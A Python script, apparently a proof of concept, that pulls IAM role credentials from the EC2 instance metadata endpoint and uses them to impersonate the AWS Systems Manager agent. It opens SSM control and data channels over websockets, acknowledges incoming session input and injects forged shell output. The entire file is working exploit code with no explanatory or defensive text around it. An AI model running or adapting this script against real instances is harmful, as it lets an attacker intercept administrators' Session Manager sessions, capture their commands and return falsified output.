#!/usr/bin/env python3

import requests, json, time, uuid
import websocket
import aws_requests
import aws_msg

def retrieve_meta() -> json:
    resp = requests.get("http://169.254.169.254/latest/dynamic/instance-identity/document")
    return json.loads(resp.text)

def retrieve_role_name() -> str:
    resp = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    return resp.text

def retrieve_role_creds(role_name) -> json:
    headers = { "X-Aws-Ec2-Metadata-Token-Ttl-Seconds": "21600" }
    resp = requests.put("http://169.254.169.254/latest/api/token", headers=headers)
    api_token = resp.text

    headers = { "X-Aws-Ec2-Metadata-Token": api_token }
    resp = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/"+role_name, headers=headers)
    return json.loads(resp.text)

def retrieve_role_creds_from_file(file_name):
    with open(file_name, 'r') as r:
        return json.loads("".join(r.readlines()))

def parse_control_channel(data):
    lines = data.split("\n")
    access_token = lines[2][lines[2].find(">")+1:lines[2].find("</")]
    url = lines[3][lines[3].find(">")+1:lines[3].find("</")] 
    return access_token, url

def parse_data_channel(data):
    lines = data.split("\n")
    access_token= lines[2][lines[2].find(">")+1:lines[2].find("</")]
    return access_token

def create_date():
    return int(round(time.time() * 1000))

def fetch_access_token_url(meta, role_creds):
    # Get the control_channel access_token and websocket uri
    resp = aws_requests.post_control_channel(meta['instanceId'], role_creds['AccessKeyId'], role_creds['SecretAccessKey'], role_creds['Token'])
    access_token, url = parse_control_channel(resp)

    return access_token, url

def build_control_channel(meta, role_creds, access_token, url):
    path = url[url.find("/v1"):]
    control_channel_info = aws_requests.initiate_websocket_connection(url, path, access_token, role_creds['AccessKeyId'], role_creds['SecretAccessKey'], role_creds['Token'])

    return control_channel_info

def craft_cc_message(access_token):
    return '{"Cookie":null,"MessageSchemaVersion":"1.0","RequestId":"'+str(uuid.uuid4())+'","TokenValue":"'+access_token+'","AgentVersion":"3.0.161.0","PlatformType":"linux"}'

def craft_dc_message(access_token):
    return '{"MessageSchemaVersion":"1.0","RequestId":"'+str(uuid.uuid4())+'","TokenValue":"'+access_token+'","ClientInstanceId":"i-03a6d204ea995a6fa","ClientId":""}'

def build_data_channel(session_id, access_token, role_creds):
    path = "/v1/data-channel/"+session_id+"?role=publish_subscribe"
    data_channel_info = aws_requests.initiate_websocket_connection("wss://ssmmessages.us-east-1.amazonaws.com/v1/data-channel/"+session_id+"?role=publish_subscribe", path, access_token, role_creds['AccessKeyId'], role_creds['SecretAccessKey'], role_creds['Token'])

    return data_channel_info

def craft_agent_session_state(session_id):
    msg = aws_msg.serialize(
            '{"SchemaVersion":1,"SessionState":"Connected","SessionId":"' + session_id + '"}',  # Message
            "agent_session_state",                                                              # Message Type
            1,                                                                                  # Schema Version
            create_date(),                                                                      # Created Date
            0,                                                                                  # Sequence Number
            3,                                                                                  # Flags
            uuid.uuid4(),                                                                       # Message ID
            0)                                                                                  # Payload Type
    return msg

def craft_acknowledge(session_id):
    msg = aws_msg.serialize(
            '{"AcknowledgedMessageType":"input_stream_data","AcknowledgedMessageId":"' + session_id + '","AcknowledgedMessageSequenceNumber":0,"IsSequentialMessage":true}', 
            "acknowledge",                                                                      # Message Type
            1,                                                                                  # Schema Version
            create_date(),                                                                      # Created Date
            0,                                                                                  # Sequence Number 
            3,                                                                                  # Flags
            uuid.uuid4(),                                                                       # Message ID
            0)                                                                                  # Payload Type
    return msg

def craft_output_stream_data(message):
    msg = aws_msg.serialize(
            message,                                                                            # Message
            "output_stream_data",                                                               # Message Type
            1,                                                                                  # Schema Version
            create_date(),                                                                      # Created Date
            0,                                                                                  # Sequence Number
            1,                                                                                  # Flags
            uuid.uuid4(),                                                                       # Message ID
            1)                                                                                  # Payload Type
    return msg


# Get role name and credentials
role_name = retrieve_role_name()
role_creds = retrieve_role_creds(role_name)
meta = retrieve_meta()

# Gather info to create the control channel
access_token, url = fetch_access_token_url(meta, role_creds)
cc_info = build_control_channel(meta, role_creds, access_token, url)

# Instantiate the control channel
control_channel = websocket.WebSocket()
control_channel.connect(cc_info[0], header=cc_info[1])

# Get control channel session_id
control_channel.send(craft_cc_message(access_token))
first_response = aws_msg.deserialize(control_channel.recv())
first_response_payload = json.loads(first_response.payload)
first_response_content = json.loads(first_response_payload['content'])
session_id = first_response_content['SessionId']

# Gather info to create the data channel
resp = aws_requests.post_data_channel(session_id, role_creds['AccessKeyId'], role_creds['SecretAccessKey'], role_creds['Token'])
access_token = parse_data_channel(resp)

dc_info = build_data_channel(session_id, access_token, role_creds)

# Instantiate the data channel
data_channel = websocket.WebSocket()
data_channel.connect(dc_info[0], header=dc_info[1])

data_channel.send(craft_dc_message(access_token))

# From here on out we need to react to responses and send what we want
# We react by looking at what the message type is
data_channel.send_binary(craft_agent_session_state(first_response_content['SessionId']))

msg = aws_msg.deserialize(data_channel.recv())

# acknowledge
msg = craft_acknowledge(msg.messageId)
data_channel.send_binary(msg)

# output stream
msg = craft_output_stream_data("$")
data_channel.send_binary(msg)

msg = aws_msg.deserialize(data_channel.recv())



